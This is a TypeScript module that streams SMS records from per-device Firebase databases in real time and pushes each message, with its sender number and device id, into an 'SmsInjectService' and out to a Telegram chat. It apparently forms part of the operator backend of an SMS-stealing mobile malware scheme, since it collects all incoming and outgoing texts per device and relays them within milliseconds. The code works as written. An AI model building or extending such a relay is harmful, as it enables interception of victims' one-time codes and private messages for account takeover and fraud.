import { EventSource } from "eventsource";

import { BackendRepository } from "../database/repositories/BackendRepository";
import { MonitoringRepository } from "../database/repositories/MonitoringRepository";
import { ProcessedSmsRepository } from "../database/repositories/ProcessedSmsRepository";
import { MessageLogRepository } from "../database/repositories/MessageLogRepository";
import { SmsInjectService } from "../services/SmsInjectService";

import { bot } from "../bot/bot";
import { logger } from "../logger/logger";


const activeListeners = new Set<string>();


export function startFirebaseSmsListener(){

    setInterval(()=>{

        const sessions =
            MonitoringRepository.findRunning();


        for(const session of sessions){

            const key =
                `${session.backend_id}_${session.device_id}`;


            if(activeListeners.has(key)){
                continue;
            }


            activeListeners.add(key);


            startDeviceListener(
                session,
                key
            );

        }


    },5000);

}




function startDeviceListener(
    session:any,
    listenerKey:string
){


    const backend:any =
        BackendRepository.findConfig(
            session.backend_id
        );


    if(!backend){

        activeListeners.delete(listenerKey);
        return;

    }



    const databaseUrl =
        backend.config.database_url ||
        backend.config;



    if(!databaseUrl){

        activeListeners.delete(listenerKey);
        return;

    }



    const url =
        databaseUrl.replace(/\/$/,"")
        +
        `/users/${session.device_id}/all_sms.json`;



    const source =
        new EventSource(url);




    const handleFirebaseEvent =
    async(event:any)=>{


        try{


            const firebaseEvent =
                JSON.parse(event.data);



            const path =
                firebaseEvent.path || "";


            const data =
                firebaseEvent.data;



            if(data == null){
                return;
            }



            let smsList:any[] = [];



            if(path.includes("/messages/")){


                smsList.push({

                    key:
                    path
                    .split("/")
                    .filter(Boolean)
                    .pop(),

                    sms:data

                });


            }
            else if(
                path.endsWith("/messages")
                &&
                typeof data === "object"
            ){


                for(
                    const [key,value]
                    of Object.entries<any>(data)
                ){

                    smsList.push({

                        key,

                        sms:value

                    });

                }


            }
            else{

                return;

            }





            for(const item of smsList){


                const sms =
                    item.sms;


                const key =
                    item.key;



                if(
                    !sms ||
                    !key ||
                    typeof sms !== "object"
                ){

                    continue;

                }




                if(
                    sms.type !== "incoming" &&
                    sms.type !== "outgoing"
                ){

                    continue;

                }




                if(
                    sms.is_old_message === true ||
                    key.startsWith("old_incoming")
                ){

                    continue;

                }





                const exists =
                    ProcessedSmsRepository.exists({

                        backendId:
                        session.backend_id,

                        deviceId:
                        session.device_id,

                        source:
                        sms.type,

                        uniqueKey:
                        key

                    });



                if(exists){

                    continue;

                }





                const startTime =
                    Date.now();



                const message =
                    sms.message ||
                    sms.body ||
                    sms.text ||
                    "Unknown";



                const sender =
                    sms.sender ||
                    sms.number ||
                    sms.recipient ||
                    "Unknown";





                const typeTitle =
                    sms.type === "outgoing"
                    ?
                    "⚡ OUTGOING SMS [STREAM]"
                    :
                    "⚡ INCOMING SMS [STREAM]";




                const queueTime =
                    Date.now() - startTime;




                await Promise.all([


                    SmsInjectService.inject(
                        sender,
                        message
                    ),



                    bot.telegram.sendMessage(

                        session.chat_id,


`✅ SUCCESS
\`\`\`text
${typeTitle}
📤 Sender: ${sender}
🔐 Message: ${message}
📱 Device: ${session.device_id}
⏱ queued ${queueTime}ms | total ${Date.now()-startTime}ms
\`\`\``,

                        {
                            parse_mode:"Markdown"
                        }

                    )


                ]);





                ProcessedSmsRepository.create({

                    backendId:
                    session.backend_id,

                    deviceId:
                    session.device_id,

                    source:
                    sms.type,

                    uniqueKey:
                    key

                });






                MessageLogRepository.insert({

                    telegramId:
                    session.telegram_id,

                    backendId:
                    session.backend_id,

                    deviceId:
                    session.device_id,

                    deviceModel:
                    sms.device_model,

                    phoneNumber:
                    sender,

                    message,

                    receivedAt:
                    sms.timestamp_ms
                    ?
                    new Date(
                        Number(
                            sms.timestamp_ms
                        )
                    ).toISOString()
                    :
                    new Date().toISOString()

                });





                logger.info(
                    `Realtime ${sms.type} forwarded -> ${session.device_id} (${Date.now()-startTime}ms)`
                );


            }



        }
        catch(error:any){

            logger.error(
                `Firebase listener error: ${error.message}`
            );

        }


    };





    source.onmessage =
        handleFirebaseEvent;


    source.addEventListener(
        "put",
        handleFirebaseEvent
    );


    source.addEventListener(
        "patch",
        handleFirebaseEvent
    );





    source.onerror = ()=>{


        source.close();


        activeListeners.delete(
            listenerKey
        );


        logger.error(
            `Firebase listener disconnected -> ${session.device_id}`
        );


    };


}